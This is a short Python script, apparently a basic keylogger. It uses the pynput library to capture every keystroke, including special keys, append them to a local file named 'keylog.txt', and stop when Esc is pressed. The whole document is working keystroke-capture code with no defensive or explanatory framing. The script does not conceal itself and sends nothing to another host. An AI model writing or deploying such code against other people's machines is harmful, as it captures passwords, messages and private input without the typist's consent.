from pynput import keyboard

# The file to which we'll save the keystrokes
log_file = "keylog.txt"

# Function to log the keystrokes
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Special keys (e.g., arrow keys, function keys) are represented differently
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

# Function to handle the release of keys (can be used to stop the listener if needed)
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener on 'esc' key press
        return False

# Start the listener to monitor keyboard input
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
